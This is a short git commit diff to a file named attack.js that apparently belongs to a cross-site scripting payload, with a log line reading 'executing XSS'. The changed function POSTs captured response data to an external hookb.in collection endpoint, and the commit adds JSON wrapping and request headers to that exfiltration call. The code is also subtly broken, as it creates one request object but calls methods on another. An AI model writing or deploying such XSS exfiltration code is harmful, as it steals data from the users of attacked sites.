1d026e06a1232c8746a3e2ad19ec5d41f96642bd
Daniel Spencer <danielspencer305@hotmail.co.uk>
2022-03-02 18:04:09 -0500

    Attempt to fix

--- attack.js
+++ attack.js
@@ -4,7 +4,12 @@ const ENDPOINT = "https://hookb.in/XkozB9BEQ6hDYMQQEw8Z";
 function forwardResponse(res) {
 	let fwdxhr = new XMLHttpRequest();
 	xhr.open("POST", ENDPOINT, true);
-	xhr.send(res)
+	xhr.setRequestHeader("Content-Type", "application/json");
+	xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+	const data = JSON.stringify({
+		"data": res,
+	});
+	xhr.send(data)
 }
 
 console.log('executing XSS');
